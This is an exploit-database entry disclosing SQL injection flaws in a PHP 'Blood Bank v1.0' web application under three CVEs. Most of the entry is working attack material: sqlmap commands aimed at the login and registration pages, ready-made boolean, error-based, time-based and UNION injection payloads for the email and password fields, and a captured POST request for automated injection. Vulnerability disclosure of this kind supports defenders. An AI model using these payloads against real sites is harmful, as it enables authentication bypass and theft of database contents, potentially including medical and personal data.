@@ -1,0 +1,181 @@
+id: 39384
+date: 02/28/2024
+title: Blood Bank v1.0 - Multiple SQL Injection Vulnerability
+author: Ersin Erenler
+cves: CVE-2023-46014, CVE-2023-46017, CVE-2023-46018
+
+# Exploit Title: Blood Bank v1.0 SQL Injection Vulnerability
+# Exploit Author: Ersin Erenler
+# Vendor Homepage: https://code-projects.org/blood-bank-in-php-with-source-code
+# Software Link: https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
+# Version: 1.0
+# Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0
+# CVE : CVE-2023-46014, CVE-2023-46017, CVE-2023-46018
+
+-------------------------------------------------------------------------------
+
+1. Description:
+
+The lack of proper input validation and sanitization on the 'hemail' and 'hpassword' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database.
+
+Vulnerable File: /hospitalLogin.php
+
+Parameter Names: hemail, hpassword
+
+2. Proof of Concept:
+----------------------
+
+Execute sqlmap using either the 'hemain' or 'hpassword' parameter to retrieve the current database:
+
+sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p hemail --risk 3 --level 3 --dbms mysql --batch --current-db
+
+SQLMap Response:
+----------------------
+Parameter: hemail (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: hemail=test@test' AND 3778=(SELECT (CASE WHEN (3778=3778) THEN 3778 ELSE (SELECT 9754 UNION SELECT 4153) END))-- -&hpassword=test&hlogin=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: hemail=test@test' OR (SELECT 3342 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(3342=3342,1))),0x7170767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NSQu&hpassword=test&hlogin=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: hemail=test@test' AND (SELECT 5639 FROM (SELECT(SLEEP(5)))ulgW)-- QYnb&hpassword=test&hlogin=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: hemail=test@test' UNION ALL SELECT CONCAT(0x716a7a6b71,0x567a4f6f4b556976707668696878754f48514d6e63424a706f70714e6f62684f504a7a565178736a,0x7170767a71),NULL,NULL,NULL,NULL,NULL-- -&hpassword=test&hlogin=Login
+
+
+-------------------------------------------------------------------------------
+
+1. Description:
+
+The lack of proper input validation and sanitization on the 'remail' and 'rpassword' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database
+
+Vulnerable File: /receiverLogin.php
+
+Parameter Names: remail, rpassword
+
+2. Proof of Concept:
+----------------------
+
+Execute sqlmap using either the 'remail' or 'rpassword' parameter to retrieve the current database:
+
+sqlmap -u "http://localhost/bloodbank/file/receiverLogin.php" --method POST --data "remail=test@test&rpassword=test&rlogin=Login" -p remail --risk 3 --level 5 --dbms mysql --batch --current-db
+
+sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p rpassword --risk 3 --level 5 --dbms mysql --batch --current-db
+
+SQLMap Response:
+----------------------
+---
+Parameter: remail (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: remail=test@test' AND 1348=(SELECT (CASE WHEN (1348=1348) THEN 1348 ELSE (SELECT 5898 UNION SELECT 1310) END))-- -&rpassword=test&rlogin=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: remail=test@test' OR (SELECT 9644 FROM(SELECT COUNT(*),CONCAT(0x7170707171,(SELECT (ELT(9644=9644,1))),0x7178706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HyEh&rpassword=test&rlogin=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: remail=test@test' AND (SELECT 5587 FROM (SELECT(SLEEP(5)))hWQj)-- NUfN&rpassword=test&rlogin=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: remail=test@test' UNION ALL SELECT NULL,CONCAT(0x7170707171,0x4e764e5452486270544a6e4c705a79535a667441756d556b416e7961484a534a647542597a61466f,0x7178706271),NULL,NULL,NULL,NULL,NULL-- -&rpassword=test&rlogin=Login
+---
+---
+Parameter: rpassword (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: remail=test@test&rpassword=test' AND 9149=(SELECT (CASE WHEN (9149=9149) THEN 9149 ELSE (SELECT 9028 UNION SELECT 5274) END))-- -&rlogin=Login
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: remail=test@test&rpassword=test' OR (SELECT 6087 FROM(SELECT COUNT(*),CONCAT(0x7170707171,(SELECT (ELT(6087=6087,1))),0x7178706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VRqW&rlogin=Login
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: remail=test@test&rpassword=test' AND (SELECT 4449 FROM (SELECT(SLEEP(5)))eegb)-- Cuoy&rlogin=Login
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: remail=test@test&rpassword=test' UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6e686d776376736a706f47796d474a736a48566f72625a4e6d537247665a444f684154684b476d62,0x7178706271),NULL,NULL,NULL,NULL,NULL-- -&rlogin=Login
+---
+
+
+-------------------------------------------------------------------------------
+
+# Description:
+
+The lack of proper input validation and sanitization on the 'remail' parameter allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database.
+
+Vulnerable File: /receiverReg.php
+
+Parameter Name: remail
+
+# Proof of Concept:
+----------------------
+
+1. Save the POST request of receiverReg.php to a request.txt file
+
+---
+POST /bloodbank/file/receiverReg.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------2653697510272605730288393868
+Content-Length: 877
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/bloodbank/register.php
+Cookie: PHPSESSID=<some-cookie-value>
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rname"
+
+test
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rbg"
+
+A+
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rcity"
+
+test
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rphone"
+
+05555555555
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="remail"
+
+test@test
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rpassword"
+
+test123
+-----------------------------2653697510272605730288393868
+Content-Disposition: form-data; name="rregister"
+
+Register
+-----------------------------2653697510272605730288393868--
+
+---
+
+2. Execute sqlmap using 'remail' parameter to retrieve the current database:
+
+sqlmap -r request.txt -p remail --risk 3 --level 3 --dbms mysql --batch --current-db
+
+#  0day.today [2024-03-04]  #
